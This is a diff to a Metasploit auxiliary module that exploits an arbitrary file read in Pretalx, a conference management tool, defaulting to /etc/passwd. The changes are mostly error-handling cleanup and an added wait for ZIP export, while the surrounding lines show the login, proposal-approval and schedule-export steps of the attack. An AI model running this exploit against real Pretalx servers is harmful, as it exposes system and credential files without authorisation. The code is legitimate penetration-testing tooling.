@@ -34,9 +34,9 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
       OptString.new('MEDIA_URL', [true, 'Prepend path to file path that allows arbitrary read', '/media']),
-      OptString.new('USERNAME', [true, 'Username to Pretalx backend', '']),
-      OptString.new('PASSWORD', [true, 'Password to Pretalx backend', '']),
-      OptString.new('CONFERENCE_NAME', [true, 'Name of conference on behalf which file read will be performed', ''])
+      OptString.new('USERNAME', [true, 'Username to Pretalx backend']),
+      OptString.new('PASSWORD', [true, 'Password to Pretalx backend']),
+      OptString.new('CONFERENCE_NAME', [true, 'Name of conference on behalf which file read will be performed'])
     ])
   end
 
@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
-    fail_with(Failure::NotFound, 'Could not find CSRF token') unless csrf_token
+    fail_with(Failure::Unknown, 'Could not find CSRF token') unless csrf_token
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true
     })
 
-    fail_with(Failure::NotFound, 'Cannot find session token') unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/
+    fail_with(Failure::Unknown, 'Cannot find session token') unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/
 
     @pretalx_token = Regexp.last_match(1)
 
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     submission_type = res.get_hidden_inputs.dig(0, 'submission_type')
     res.get_hidden_inputs.dig(0, 'content_locale')
 
-    fail_with(Failure::NotFound, 'Could not find hidden inputs: creating general info') unless submit_uri && csrf_token
+    fail_with(Failure::Unknown, 'Could not find hidden inputs: creating general info') unless submit_uri && csrf_token
 
     @proposal_name = Rex::Text.rand_text_alphanumeric(10)
 
@@ -116,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
-    fail_with(Failure::NotFound, 'Could not find hidden inputs: creating account info') unless submit_uri && csrf_token
+    fail_with(Failure::Unknown, 'Could not find hidden inputs: creating account info') unless submit_uri && csrf_token
 
     data_post = Rex::MIME::Message.new
     data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
-    fail_with(Failure::NotFound, 'Could not found hidden inputs: creating profile info') unless submit_uri && csrf_token
+    fail_with(Failure::Unknown, 'Could not found hidden inputs: creating profile info') unless submit_uri && csrf_token
 
     Rex::Text.rand_text_alphanumeric(16).to_s
 
@@ -204,11 +204,11 @@ class MetasploitModule < Msf::Auxiliary
 
     proposal_element = html.xpath('//td/a')&.find { |link| link.text.strip == @proposal_name }
 
-    fail_with(Failure::NotFound, 'Failed to find URI to proposal') unless proposal_element
+    fail_with(Failure::Unknown, 'Failed to find URI to proposal') unless proposal_element
 
     proposal_uri = proposal_element['href']
 
-    fail_with(Failure::PayloadFailed, 'Could not find proposal ID') unless proposal_uri =~ %r{/orga/event/#{datastore['CONFERENCE_NAME']}/submissions/([a-zA-Z0-9]+)/}
+    fail_with(Failure::Unknown, 'Could not find proposal ID') unless proposal_uri =~ %r{/orga/event/#{datastore['CONFERENCE_NAME']}/submissions/([a-zA-Z0-9]+)/}
 
     proposal_id = Regexp.last_match(1)
 
@@ -237,6 +237,8 @@ class MetasploitModule < Msf::Auxiliary
     next_token = res.get_hidden_inputs.dig(0, 'next')
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
+    fail_with(Failure::Unknown, 'Could not find required hidden inputs') unless next_token && csrf_token
+
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(approval_uri),
@@ -253,6 +255,8 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::UnexpectedReply, 'Could not get approval confirmation page') unless res&.code == 200
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    fail_with(Failure::Unknown, 'Could not find csrf token') unless next_token && csrf_token
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -353,7 +357,10 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     fail_with(Failure::UnexpectedReply, 'Could not export schedule') unless res&.code == 200
-
+    # wait for ZIP file to be generated
+    # there's no reasonable way to wait for ZIP generating, adding 5 second delay
+    vprint_status('Waiting for ZIP to be generated...')
+    sleep(5)
     res = send_request_cgi!({
       'method' => 'GET',
       'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'download')
